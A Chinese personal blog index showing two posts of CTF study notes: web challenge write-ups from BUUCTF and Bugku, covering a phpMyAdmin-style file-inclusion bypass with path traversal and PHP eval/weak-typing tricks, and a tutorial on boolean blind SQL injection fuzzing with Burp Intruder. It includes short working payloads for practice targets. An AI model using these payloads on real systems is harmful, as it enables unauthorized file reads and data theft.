<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"-181.github.io","root":"/","scheme":"Pisces","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="左">
<meta property="og:url" content="https://-181.github.io/index.html">
<meta property="og:site_name" content="左">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="左">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://-181.github.io/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>左</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">左</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">春有百花秋有月， 夏有凉风冬有雪</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="左"
      src="/image/avatar.jpg">
  <p class="site-author-name" itemprop="name">左</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">
      

      
    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/04/05/%E5%87%A0%E9%81%93%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/05/%E5%87%A0%E9%81%93%E9%A2%98/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-04-05 23:22:06" itemprop="dateCreated datePublished" datetime="2021-04-05T23:22:06+08:00">2021-04-05</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-04-15 12:52:02" itemprop="dateModified" datetime="2021-04-15T12:52:02+08:00">2021-04-15</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>做了几道题，写个笔记</p>
<h2 id="BUUCTF的Web真题"><a href="#BUUCTF的Web真题" class="headerlink" title="BUUCTF的Web真题"></a>BUUCTF的Web真题</h2><h3 id="WarmUp-（任意文件包含漏洞）"><a href="#WarmUp-（任意文件包含漏洞）" class="headerlink" title="WarmUp （任意文件包含漏洞）"></a>WarmUp （任意文件包含漏洞）</h3><p>查看源码：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/warm1.png"></p>
<p>可以发现提示有source.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be326190-e159-4cb1-8994-cf72b7960fe7.node3.buuoj.cn&#x2F;source.php</span><br></pre></td></tr></table></figure>

<p>查看文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">##不能为空</span></span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">##是字符串</span></span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">##上面checkfile返回为true</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看hint.php，提示：flag not here, and flag in ffffllllaaaagggg</p>
<p>白名单只有source.php和hint.php，通过访问hint.php我们可以知道flag在ffffllllaaaagggg文件中</p>
<p>经过百度发现这是一个phpmyadmin 4.8.1 远程文件包含漏洞</p>
<p>代码审计<br>checkfile()函数</p>
<pre><code>定义了一个白名单：source.php和hint.php，判断$page是否为空、是否为字符串。
判断$page是否在白名单里，若存在返回true；
考虑到page有参数的情况，$_page是取出$page问号前的东西，然后再判断$_page是否在白名单里，若存在则返回true；
如果上一步判断失败，则又考虑了url编码的问题，因为url在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使checkfile返回true。</code></pre>
<p>例如:<br>传入?file=hint.php%253f../../../../../../../../ffffllllaaaagggg，因为服务器会自动解一次码，所以$page的值为hint.php%3f../../../../../../../../ffffllllaaaagggg，又一次url解码后，$_page的值为hint.php?../../../../../../../../ffffllllaaaagggg,然后截取问号前面的hint.php判断在白名单里返回true。</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>用<code>../</code>读取上级目录</p>
<h2 id="Bugku-CTF"><a href="#Bugku-CTF" class="headerlink" title="Bugku CTF"></a>Bugku CTF</h2><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/web2.1.png"></p>
<p>像这种反弹flag的题目，直接查看页面源代码，绝对有链接指向flag，比如这题的js/code.js， 以小见大，以后在渗透测试过程中，要养成检查页面源代码的习惯，有时候会暴露内网地址，重要路径等重要信息</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/web2.png"></p>
<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>题目直接就是一串代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what&#x3D;$_GET[&#39;what&#39;];</span><br><span class="line"> echo $what;</span><br><span class="line"> if($what&#x3D;&#x3D;&#39;flag&#39;)</span><br><span class="line"> echo &#39;flag&#123;****&#125;&#39;;</span><br></pre></td></tr></table></figure>

<p>根据代码，如果get参数what的值等于flag则输出flag，那么，可以用<strong>get传参</strong>，在URL里面输入满足条件即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网址?what&#x3D;flag</span><br></pre></td></tr></table></figure>







<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>题目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what&#x3D;$_POST[&#39;what&#39;];</span><br><span class="line">echo $what;</span><br><span class="line">if($what&#x3D;&#x3D;&#39;flag&#39;)</span><br><span class="line">echo &#39;flag&#123;****&#125;&#39;;</span><br></pre></td></tr></table></figure>

<p>类似上题，<strong>POST传参</strong></p>
<p>HackBar，POST输入<code>what=flag</code></p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>题目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num&#x3D;$_GET[&#39;num&#39;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num&#x3D;&#x3D;1)</span><br><span class="line">echo &#39;flag&#123;**********&#125;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php 弱类型比较</p>
<p><code>is_numeric()</code> <em>函数</em>  用于检测变量是否为数字或数字字符串。需要输入非数字</p>
<p>php是弱类型语言，双等号判断 1 == （以1开头的字符串） 结果都为true</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;1&#39;</span><br></pre></td></tr></table></figure>







<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>打开题目，关闭掉无限弹窗之后，一片空白，什么也没有</p>
<p>查看源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;BKCTF-WEB6&lt;&#x2F;title&gt;  </span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot;&gt;    </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;);  </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;); </span><br><span class="line">alert(&quot;flag就在这里&quot;);  </span><br><span class="line">alert(&quot;来找找吧&quot;);  </span><br><span class="line">&lt;!-- &amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#57;&amp;#102;&amp;#53;&amp;#49;&amp;#102;&amp;#49;&amp;#97;&amp;#100;&amp;#51;&amp;#97;&amp;#100;&amp;#100;&amp;#49;&amp;#55;&amp;#50;&amp;#97;&amp;#102;&amp;#56;&amp;#57;&amp;#50;&amp;#50;&amp;#48;&amp;#51;&amp;#49;&amp;#97;&amp;#97;&amp;#48;&amp;#98;&amp;#53;&amp;#101;&amp;#48;&amp;#56;&amp;#125; --&gt;&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;&#x2F;head&gt;  </span><br><span class="line">&lt;&#x2F;html&gt;  </span><br></pre></td></tr></table></figure>

<p>看最后一行，在<!---->&gt;里就是flag，只不过是&amp;#开头编码后的，是采用Unicode编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#57;&amp;#102;&amp;#53;&amp;#49;&amp;#102;&amp;#49;&amp;#97;&amp;#100;&amp;#51;&amp;#97;&amp;#100;&amp;#100;&amp;#49;&amp;#55;&amp;#50;&amp;#97;&amp;#102;&amp;#56;&amp;#57;&amp;#50;&amp;#50;&amp;#48;&amp;#51;&amp;#49;&amp;#97;&amp;#97;&amp;#48;&amp;#98;&amp;#53;&amp;#101;&amp;#48;&amp;#56;&amp;#125;</span><br></pre></td></tr></table></figure>

<p>将这一段注释复制，打开BurpSuite自带的编码解码及散列转换工具Decoder，选择HEML格式解码，找到flag</p>
<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>题目</p>
<p><img src="D:\图片\信安。。\h\web7.png"></p>
<p>一直自动刷新，有以上这样的CTF图案，还有不出现图片的</p>
<p>直接查看源码</p>
<p><img src="D:\图片\信安。。\h\web7...png"></p>
<p>可以看到flag is here</p>
<p>在此页面一直刷新，直到出现flag</p>
<p><img src="D:\图片\信安。。\h\web7..png"></p>
<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>题目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $a &#x3D; @$_REQUEST[&#39;hello&#39;];</span><br><span class="line">    eval( &quot;var_dump($a);&quot;);</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>var_dump()函数可以打印</p>
<p>可以用hello读文件</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?hello&#x3D;file(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure>





<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>globals函数</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?args&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>

<p>?args=file(‘flag1.php’)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/01/31/SQL%E7%9B%B2%E6%B3%A8%E4%B9%8Bbool%E5%9E%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/31/SQL%E7%9B%B2%E6%B3%A8%E4%B9%8Bbool%E5%9E%8B/" class="post-title-link" itemprop="url">SQL盲注之bool型</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-31 21:27:10" itemprop="dateCreated datePublished" datetime="2021-01-31T21:27:10+08:00">2021-01-31</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-02-09 12:10:01" itemprop="dateModified" datetime="2021-02-09T12:10:01+08:00">2021-02-09</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。</p>
<h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</span><br></pre></td></tr></table></figure>

<h4 id="盲注的三种类型"><a href="#盲注的三种类型" class="headerlink" title="盲注的三种类型"></a>盲注的三种类型</h4><p><strong>bool型</strong>（布尔型）：</p>
<p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p>
<p>当前数据库database（）的长度大于10，返回true页面，否则FALSE页面</p>
<p><strong>报错型</strong>：</p>
<p>构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p>
<p><strong>时间型</strong>：</p>
<p>通过页面沉睡时间判断</p>
<p>通过 sleep（）函数测试，通过if（）和sleep（）联合逐个猜解数据</p>
<h2 id="bool型盲注"><a href="#bool型盲注" class="headerlink" title="bool型盲注"></a>bool型盲注</h2><p>可以发现，输入?cat=1和cat=2，cat=10000返回的都是cat.png</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/cat1.png"></p>
<p>而输出1’ 返回none.png</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/cat-1.png"></p>
<p>因此可以想到bool盲注</p>
<p>通过不断测试，可以知道，当输入的内容不包含过滤时，返回cat.png；当输入含有过滤的字符时，返回的是nono.png；当输入的sql查询语句有误且不包含过滤字符时，返回空白页面。</p>
<p>借此可以FUZZ出被过滤掉的字符：</p>
<h5 id="burpsuite爆破fuzz"><a href="#burpsuite爆破fuzz" class="headerlink" title="burpsuite爆破fuzz"></a>burpsuite爆破fuzz</h5><p>抓包，右键Send to Intruder，点击Intruder，可以看到Target的host中有IP地址；点击Positions，Clear清除被选中的绿色部分；</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/positions.png"></p>
<p>由于经常用cat=1‘来测试，可以想到，标记1后面<code>‘</code>的位置，选中之后点击Add；点击Payloads，由于是SQL数据库，我们选择自带的字典，Add from list中的Fuzzing - SQL，然后点击右上方的【Start attack】进行跑字典爆破攻击 ；</p>
<p>点击Length按长度排序 ，根据返回包长度可以分辨不同的情况：202是password error，200是no such user!，还有189是naive。点选不同结果的某条攻击结果。</p>
<p><code>union</code> <code>*</code> <code> &#39;</code> <code>&quot;</code> <code>substr</code> <code>mid</code> <code>=</code> <code>like</code> <code>into</code> <code>file</code> <code>sleep</code> <code>benchmark</code> <code>^</code> <code>or</code> <code>空格</code> <code>&amp;</code> <code>&gt;</code> <code>&lt;</code> <code>#</code> <code>-</code> <code>ascii</code> <code>ord</code></p>
